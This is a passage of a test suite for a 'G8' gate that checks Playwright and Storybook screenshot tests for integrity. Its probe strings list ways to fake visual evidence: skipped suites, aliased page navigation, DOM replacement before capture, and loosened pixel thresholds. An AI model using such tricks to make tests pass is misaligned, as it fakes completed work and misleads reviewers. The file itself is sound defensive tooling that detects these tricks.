    /must bind test and expect directly to @playwright\/test/,
  );
});

test("G8 rejects a computed test.skip call in the Storybook visual test", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ computedSkip: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /cannot contain test\.skip, test\.fixme, test\.fail, or test\.only calls/,
  );
});

test("G8 rejects a Storybook visual test inside a skipped describe block", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ describeSkip: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /storybook-visual\.spec\.ts cannot disable or reconfigure Playwright suites/,
  );
});

test("G8 rejects a Storybook file configured to skip its suite", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ describeConfigureSkip: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /storybook-visual\.spec\.ts cannot disable or reconfigure Playwright suites/,
  );
});

test("G8 rejects a Storybook suite whose mode can conditionally skip", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ describeConfigureDynamic: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /storybook-visual\.spec\.ts cannot disable or reconfigure Playwright suites/,
  );
});

test("G8 requires each Storybook screenshot to visit that story's iframe", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ omitStoryNavigation: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects a disconnected hard-coded Storybook story list", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ detachedIndex: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index, enumerate every story, reject an empty set, and await its per-story screenshot baseline/,
  );
});

test("G8 rejects a locally shadowed fetch function in Storybook coverage", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ shadowFetch: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index/,
  );
});

test("G8 requires the story id in the iframe id query parameter", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ storyNavigationWithOtherInterpolation: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index/,
  );
});

test("G8 rejects navigation through a page alias and nearby alias forms", async () => {
  const aliasProbes = [
    "  const p = page; await p.goto('/');",
    "  let p; p = page; await p.goto('/');",
    "  const { goto } = page; await goto.call(page, '/');",
    "  const go = page.goto.bind(page); await go('/');",
    "  const p = await Promise.resolve(page); await p.goto('/');",
    "  let p; p ??= page; await p.goto('/');",
    "  const navigate = async (targetPage) => targetPage.goto('/'); await navigate(page);",
    '  await page.setContent("<main>not the story</main>");',
  ];

  for (const pageAliasNavigation of aliasProbes) {
    const result = await runVisualScope({
      routes: INVENTORY_ROUTES,
      storySource: storybookSpec({ pageAliasNavigation }),
    });

    assert.notEqual(result.status, 0, pageAliasNavigation);
    assert.match(
      result.output,
      /Storybook visual test must load the exported-story index/,
      pageAliasNavigation,
    );
  }
});

test("G8 rejects arbitrary or mutating Storybook evaluation callbacks", async () => {
  const mutationProbes = [
    {
      pageEvaluateCallback:
        "() => { document.body.innerHTML = '<main>not the story</main>'; }",
    },
    {
      pageEvaluateCallback:
        "() => { document.documentElement.replaceChildren(); }",
    },
    {
      pageEvaluateCallback:
        "async () => { await document.fonts.ready; document.body.replaceChildren(); await new Promise<void>((resolve) => requestAnimationFrame(() => resolve())); }",
    },
    {
      storyRootReadCallback:
        "(root) => { root.innerHTML = '<main>not the story</main>'; return true; }",
    },
    {
      additionalPageEvaluation:
        "  await page.evaluate(() => document.body.innerHTML = '<main>not the story</main>');",
    },
    {
      additionalLocatorEvaluation:
        '  await page.locator("body").evaluate((body) => body.innerHTML = "<main>not the story</main>");',
    },
    {
      outsideLoopMutation:
        'document.body.innerHTML = "<main>not the story</main>";',
    },
  ];

  for (const mutationProbe of mutationProbes) {
    const result = await runVisualScope({
      routes: INVENTORY_ROUTES,
      storySource: storybookSpec(mutationProbe),
    });

    assert.notEqual(result.status, 0, JSON.stringify(mutationProbe));
    assert.match(
      result.output,
      /Storybook visual test must load the exported-story index/,
      JSON.stringify(mutationProbe),
    );
  }
});

test("G8 requires an immutable story loop binding", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ reassignStory: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index/,
  );
});

test("G8 rejects a nested story shadow around capture evidence", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ shadowStory: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index/,
  );
});

test("G8 requires zero pixel tolerance for inline Storybook baselines", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    storySource: storybookSpec({ excessiveInlineThreshold: true }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /Storybook visual test must load the exported-story index/,
  );
});

for (const [optionName, optionValue] of [
  ["threshold", "1"],
  ["comparator", '"ssim"'],
  ["maxDiffPixelRatio", "1"],
  ["animations", '"allow"'],
  ["caret", '"initial"'],
  ["scale", '"device"'],
]) {
  test(`G8 rejects Storybook screenshot option ${optionName}`, async () => {
    const storySource = storybookSpec().replace(
      "{ fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true }",
      `{ fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true, ${optionName}: ${optionValue} }`,
    );
    const result = await runVisualScope({
      routes: INVENTORY_ROUTES,
      storySource,
    });

    assert.notEqual(result.status, 0);
    assert.match(
      result.output,
      /Storybook visual test must load the exported-story index|contains unsafe runtime code/,
    );
  });

  test(`G8 rejects route screenshot option ${optionName}`, async () => {
    const source = visualSpec(SCREENS).replace(
      "{ fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true }",
      `{ fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true, ${optionName}: ${optionValue} }`,
    );
    const result = await runVisualScope({ routes: INVENTORY_ROUTES, source });

    assert.notEqual(result.status, 0);
    assert.match(
      result.output,
      /does not capture its declared screenshot baseline/,
    );
  });
}

test("G8 rejects later mutation of a named route screenshot options object", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      mutateScreenshotOptionsFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /does not capture its declared screenshot baseline/,
  );
});

test("G8 requires zero pixel tolerance for inline route baselines", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
    source: visualSpec(SCREENS, {
      excessiveInlineThresholdFor: "work list @visual",
    }),
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /does not capture its declared screenshot baseline/,
  );
});

test("G8 accepts a not-started route with no G8 baseline while it remains unimplemented", async () => {
  const result = await runVisualScope({
    routes: INVENTORY_ROUTES,
  });

  assert.equal(result.status, 0, result.output);
});

test("G8 rejects an implemented route whose inventory group remains not started", async () => {
  const result = await runVisualScope({
    routes: [...INVENTORY_ROUTES, "/agent/inbox"],
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /registered inventory route \/agent\/inbox has no row marked in progress or complete/,
  );
});

test("G8 rejects a baseline manifest entry for a not-started route", async () => {
  const futureScreen = {
    name: "future-inbox",
    inventoryRoute: "/agent/inbox",
    applicationRoute: "/agent/inbox",
    test: "future inbox @visual",
    screenshot: "future-inbox.png",
  };
  const result = await runVisualScope({
    screens: [...SCREENS, futureScreen],
    routes: [...INVENTORY_ROUTES, "/agent/inbox"],
  });

  assert.notEqual(result.status, 0);
  assert.match(
    result.output,
    /future-inbox references an inventory route that is not marked in progress or complete/,
  );
});
